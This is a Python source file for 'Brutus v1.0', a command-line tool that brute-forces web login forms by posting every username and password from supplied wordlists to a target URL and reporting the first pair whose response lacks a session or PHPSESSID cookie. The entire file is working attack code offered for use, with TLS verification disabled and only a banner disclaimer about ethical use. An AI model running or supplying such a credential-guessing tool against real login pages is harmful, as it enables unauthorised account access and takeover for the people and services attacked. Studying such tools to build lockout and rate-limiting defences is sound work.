import argparse
import requests
from requests.exceptions import ConnectionError, Timeout, RequestException
import urllib3
import sys
import datetime
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def check_connection(url):
	try:
		r = requests.get(url, verify=False, timeout=10)
		r.raise_for_status()
		if r.status_code == 200:
			return True
		else:
			return False
	except ConnectionError as e:
		print(f"[!] Error de conexión: No se pudo establecer la conexión con el host. {e}")
	except Timeout as e:
		print(f"Error de tiempo de espera: El servidor no respondió a tiempo. {e}")
	except RequestException as e:
		print(f"Error general en la solicitud: {e}")
	return False

def read_file(filename):
	try:
		with open(filename, "r") as file:
			return [line.strip() for line in file.readlines() if line.strip()]
	except FileNotFoundError:
		print(f"\033[31m[-] File:\033[0m {filename} \033[31mwas not found\033[0m")
		exit(1)

def brutus_panel(username, password):
	count_username = username
	count_password = password
	total = count_username * count_password
	print("Brutus v1.0 (c) 2024 by Am4ru - Use this tool ethically, do not use it to create chaos, test it in controlled environments, not in private ones. All actions will be under your responsibility.")
	print("""\033[32m
███████████                        █████                      
░░███░░░░░███                      ░░███                       
 ░███    ░███ ████████  █████ ████ ███████   █████ ████  █████ 
 ░██████████ ░░███░░███░░███ ░███ ░░░███░   ░░███ ░███  ███░░  
 ░███░░░░░███ ░███ ░░░  ░███ ░███   ░███     ░███ ░███ ░░█████ 
 ░███    ░███ ░███      ░███ ░███   ░███ ███ ░███ ░███  ░░░░███
 ███████████  █████     ░░████████  ░░█████  ░░████████ ██████ 
░░░░░░░░░░░  ░░░░░       ░░░░░░░░    ░░░░░    ░░░░░░░░ ░░░░░░  
\nBrutus v1.0 (https://github.com/am4ru1/brutus)
\033[0m""")

	print(f"\033[33m[INFO] Usernames = {count_username}\033[0m")
	print(f"\033[33m[INFO] Passwords = {count_password}\033[0m")
	print(f"\033[33m[INFO] Total 	 = {total}\033[0m\n")

def obtain_credentials(VERBOSE, url, username, password, time):
	brutus_panel(len(username), len(password))
	connection = check_connection(url)
	print(f"[+] Estableciendo conexión: \033[32m{connection}\033[0m")
	if connection:
		print(f"[+] Conexión establecida: \033[32m{connection}\033[0m\n")
		print("\033[34m[+] Finding credentials...\033[0m\n")
		for i in username:
			for j in password:
				data = {'username': i, 'password': j}
				r = requests.post(url, data=data, verify=False)
				if VERBOSE:
					print(f"[+] {time.strftime('%Y-%m-%d %H:%M:%S')} Trying: username: \033[34m{i}\033[0m - password: \033[34m{j}\033[0m - Status code: \033[32m{r.status_code}\033[0m")
					if r.status_code == 200 and 'session' not in r.cookies:
						credentials = [i, j]
						return credentials
				elif r.status_code == 200 and 'session' not in r.cookies:
					credentials = [i, j]
					return credentials
		return None
	else:
		print("\033[31m[-] Fallo en conexión\033[0m")
		sys.exit(1)

def payload_PHPSESSID(VERBOSE, PHPSESSID, url, username, password, time):
	brutus_panel(len(username), len(password))
	connection = check_connection(url)
	print(f"[+] Estableciendo conexión: \033[32m{connection}\033[0m")
	if connection:
		print(f"[+] Conexión establecida: \033[32m{connection}\033[0m\n")
		print("\033[34m[+] Finding credentials...\033[0m\n")
		for i in username:
			for j in password:
				data = {'username': i, 'password': j}
				r = requests.post(url, data=data, verify=False)
				if VERBOSE:
					print(f"[+] {time.strftime('%Y-%m-%d %H:%M:%S')} Trying in PHP: username: \033[34m{i}\033[0m - password: \033[34m{j}\033[0m - Status code: \033[32m{r.status_code}\033[0m")
					if r.status_code == 200 and 'PHPSESSID' not in r.cookies:
						credentials = [i, j]
						return credentials
				elif r.status_code == 200 and 'PHPSESSID' not in r.cookies:
						credentials = [i, j]
						return credentials
		return None
	else:
		print("\033[31m[-] Fallo en conexión\033[0m")
		sys.exit(1)

def get_user_pass(args):
	actions = {
		'user_file_and_manual': lambda: (read_file(args.user_file) if args.user_file else []) + ([args.user] if args.user else []),
		'password_file_and_manual': lambda: (read_file(args.password_file) if args.password_file else []) + ([args.password] if args.password else []),
	}

	username = actions['user_file_and_manual']()
	password = actions['password_file_and_manual']()
	return username, password

def main():
	parser = argparse.ArgumentParser(prog='Brutus', description="Obtain credentials using Brute Force", usage="%(prog)s [-h] -T <target> -U <List users> -P <List passwords> [-php] [--version]")
	parser.add_argument("-T", "--target", type=str,  help="Target <URL>")
	parser.add_argument("-U", "--user-file", type=str, help="List of usernames <user_file>")
	parser.add_argument("-P", "--password-file", type=str, help="List of passwords <password_file>")
	parser.add_argument("-u", "--user", help="put your <username>")
	parser.add_argument("-p", "--password", help="put your <password>")
	parser.add_argument("-php", "--php", action="store_true", help="brute force in PHPSESSID Login")
	parser.add_argument("-v", "--verbose", action="store_true", help="verbose mode")
	parser.add_argument("--version", action="version", version="%(prog)s 1.0")

	args = parser.parse_args()
	username, password = get_user_pass(args)
	PHPSESSID = False
	VERBOSE = args.verbose
	time = datetime.datetime.now()

	try:
		if args.php and username and password:
			PHPSESSID = True
			credentials = payload_PHPSESSID(VERBOSE, PHPSESSID, args.target, username, password, time)
			if credentials:
				print(f"\033[33m[+] Credentials:\033[0m")
				print(f"\033[32m[+] Username is:\033[0m {credentials[0]} | \033[32mPassword is:\033[0m {credentials[1]}\n")
				sys.exit(0)
			else:
				print("\033[31m[-] No valid credentials found\033[0m")
				sys.exit(1)
		elif username and password:
			credentials = obtain_credentials(VERBOSE, args.target, username, password, time)
			if credentials:
				print(f"\033[33m[+] Credentials:\033[0m")
				print(f"\033[32m[+] Username is:\033[0m {credentials[0]} | \033[32mPassword is:\033[0m {credentials[1]}\n")
				sys.exit(0)
			else:
				print("\033[31m[-] No valid credentials found\033[0m")
				sys.exit(1)
		else:
			parser.print_usage()
			print("\nExample:")
			print(f" {sys.argv[0]} -T http://www.example.com/login -U users.txt -P passwords.txt")
			print(f" {sys.argv[0]} -T http://www.example.com/login -u <USER> -p <PASSWORD>")
			print(f" {sys.argv[0]} -T http://www.example.com/login.php -php -U users.txt -P passwords.txt")
			sys.exit(1)

	except KeyboardInterrupt:
			print("\033[33m\n[-] Exited...\033[0m")

if __name__ == "__main__":
	main()
